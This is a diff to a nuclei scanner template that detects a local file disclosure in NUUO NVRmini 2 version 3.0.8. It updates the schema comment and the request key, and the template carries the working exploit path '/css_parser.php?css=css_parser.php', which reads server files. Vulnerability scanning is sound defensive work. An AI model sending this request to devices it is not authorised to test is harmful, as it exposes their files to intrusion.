@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: nuuo-file-inclusion
 info:
   name: NUUO NVRmini 2 3.0.8 Local File Disclosure
@@ -5,7 +6,7 @@ info:
   severity: high
   reference: https://www.exploit-db.com/exploits/40211
   tags: nuuo,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/css_parser.php?css=css_parser.php"
